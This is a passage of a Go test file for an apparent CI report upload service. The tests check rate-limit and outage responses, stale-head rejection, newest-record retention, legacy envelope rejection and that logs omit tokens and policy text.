		"BranchHead": {status: http.StatusServiceUnavailable, retryAfter: "60", Error: codeRateLimited},
		"File":       {status: http.StatusServiceUnavailable, Error: codeUnavailable},
	} {
		t.Run(method, func(t *testing.T) {
			w := newWorld4(t)
			p := w.openPull(w.shop, 7)
			s := w.spec4(p, "pass")
			if method == "BranchHead" {
				w.gh.fail[method] = api.ErrRateLimited
			} else {
				w.gh.fail[method] = errors.New("fake: GitHub is down")
			}
			a := w.send4(s)
			if a.status != want.status || a.retryAfter != want.retryAfter || a.Error != want.Error {
				t.Errorf("answer = %d %q %s, want %d %q %s", a.status, a.retryAfter, a.raw, want.status, want.retryAfter, want.Error)
			}
			if _, err := w.mem.Get(context.Background(), store.Tenant(shopInstallation), records.PullKey(shopName, 7)); !errors.Is(err, store.ErrNotFound) {
				t.Errorf("a record was stored without a decision: %v", err)
			}
		})
	}
}

func TestUpload4RejectionsStoreNothing(t *testing.T) {
	w := newWorld4(t)
	p := w.openPull(w.shop, 7)
	s := w.spec4(p, "pass")
	w.push(p) // the head moved after the run
	a := w.send4(s)
	if a.status != http.StatusConflict || a.Error != "stale_head" {
		t.Fatalf("answer = %d %s, want 409 stale_head", a.status, a.raw)
	}
	if _, err := w.mem.Get(context.Background(), store.Tenant(shopInstallation), records.PullKey(shopName, 7)); !errors.Is(err, store.ErrNotFound) {
		t.Errorf("a rejected upload stored a record: %v", err)
	}
}

func TestUpload4KeepsTheNewestRecord(t *testing.T) {
	w := newWorld4(t)
	p := w.openPull(w.shop, 7)
	store := func(head string, run int64, attempt int, status result.Status) error {
		u := ingest.Upload4{Binding: ingest.Binding4{Repo: w.shop, Event: "pull_request", PullRequest: 7, HeadSHA: head, RunID: run, RunAttempt: attempt},
			Envelope: envelope.EnvelopeV2{PayloadDigest: "sha256:" + strings.Repeat("c", 64)}}
		return w.gate.v4.storePull(context.Background(), u, decision4{Status: status}, true)
	}
	steps := []struct {
		head    string
		run     int64
		attempt int
		status  result.Status
		want    int64 // the run of the stored record after the step
		wantAtt int
	}{
		{p.head, 20, 1, result.StatusFail, 20, 1},
		{"older-head", 10, 3, result.StatusPass, 20, 1},
		{p.head, 20, 2, result.StatusPass, 20, 2},
		{p.head, 20, 1, result.StatusFail, 20, 2},
		{"newer-head", 30, 1, result.StatusPass, 30, 1},
	}
	for i, st := range steps {
		if err := store(st.head, st.run, st.attempt, st.status); err != nil {
			t.Fatalf("step %d: %v", i, err)
		}
		rec, head := w.pullRecord(p)
		if rec.RunID != st.want || rec.RunAttempt != st.wantAtt || head != rec.HeadSHA {
			t.Errorf("step %d: record run %d attempt %d head %q, index %q; want run %d attempt %d", i, rec.RunID, rec.RunAttempt, rec.HeadSHA, head, st.want, st.wantAtt)
		}
	}
}

func TestUploadHandlerRejectsEnvelope1(t *testing.T) {
	w := newWorld4(t)
	p := w.openPull(w.shop, 7)
	body := []byte(`{}`)
	run := w.gh.runs[p.runID]
	pull := w.gh.pulls[pullKey(p.repo.FullName, p.number)]
	raw, err := json.Marshal(map[string]any{
		"schema_version": "archfit.report-envelope.v1", "kind": "report", "repository": p.repo.FullName,
		"event": "pull_request", "pull_request": p.number, "head_sha": p.head, "base_sha": pull.BaseSHA,
		"merge_base_sha": pull.MergeBaseSHA, "analyzed_sha": pull.MergeCommitSHA, "integration": "merged",
		"run_id": p.runID, "run_attempt": run.Attempt, "engine_version": "v3.4.0", "image_digest": image4,
		"platform": "linux/amd64", "payload_digest": envelope.PayloadDigest(body), "baseline_digest": "", "labels_digest": "",
	})
	if err != nil {
		t.Fatal(err)
	}
	s := w.spec(p, body)
	s.rawEnvelope, s.token = raw, ""
	before := w.gh.writes()
	a := w.send(s)
	if a.status != http.StatusBadRequest || a.Error != "envelope_invalid" {
		t.Fatalf("answer = %d %s, want envelope_invalid before authentication", a.status, a.raw)
	}
	if w.gh.writes() != before {
		t.Fatal("legacy envelope caused a GitHub write")
	}
}

func TestUpload4LogsIdentifiersOnly(t *testing.T) {
	w := newWorld4(t)
	p := w.openPull(w.shop, 7)
	s := w.spec4(p, "deny")
	var buf bytes.Buffer
	saved := slog.Default()
	slog.SetDefault(slog.New(slog.NewJSONHandler(&buf, nil)))
	t.Cleanup(func() { slog.SetDefault(saved) })
	w.wantStatus(w.send4(s), "fail", "")
	line := buf.String()
	if !strings.Contains(line, `"envelope":2`) || !strings.Contains(line, `"status":"fail"`) {
		t.Errorf("log = %s", line)
	}
	for _, leak := range []string{"pkg_chaos", "no-chaos-to-runtime", s.token, policy4} {
		if strings.Contains(line, leak) {
			t.Errorf("the log carries %q", leak)
		}
	}
}

// decided is a decision of the v4 path, for the tests that read its records.
type decided struct{ decision4 }

func (d decided) codes() []string {
	var out []string
	for _, r := range d.Reasons {
		out = append(out, r.Code)
	}
	return out
}

// decide runs the receiver and the rules on a spec without storing or answering.
func (w *world4) decide(s *spec4) decided {
	w.t.Helper()
	body, _ := json.Marshal(s.result)
	s.body = body
	s.env.PayloadDigest = envelope.PayloadDigest(body)
	w.gh.artifacts[s.env.RunID] = body // the run keeps the bytes it uploaded (M2 D6)
	s.rawEnvelope, _ = json.Marshal(s.env)
	ctx, cancel := context.WithTimeout(context.Background(), time.Minute)
	defer cancel()
	u, err := w.gate.v4.receiver.ReceiveV2(ctx, w.request(s.uploadSpec))
	if err != nil {
		w.t.Fatal(err)
	}
	d, err := w.gate.v4.decide(ctx, u)
	if err != nil {
		w.t.Fatal(err)
	}
	return decided{d}
}
